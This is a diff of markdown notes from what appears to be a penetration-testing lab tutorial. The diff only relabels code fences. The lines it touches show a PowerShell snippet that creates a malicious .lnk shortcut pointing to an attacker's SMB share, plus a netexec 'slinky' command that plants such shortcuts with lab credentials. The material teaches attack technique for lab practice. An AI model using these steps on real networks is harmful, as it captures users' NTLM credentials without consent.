@@ -6,7 +6,7 @@ We can use elevated powershell to do this:
 
 Text to copy-paste from:
 
-```
+```Powershell
 $objShell = New-Object -ComObject WScript.shell 
 $lnk = $objShell.CreateShortcut("C:\test.lnk") 
 $lnk.TargetPath = "\\192.168.138.149\@test.png" 
@@ -21,7 +21,7 @@ What we're doing is we are taking this and we're generating a file and that is g
 
 You can also use a tool called netexec, which is a sister to crackmapexec and you can run this command in the /opt/NetExec folder:
 
-```
+```bash
 netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
 ```
 
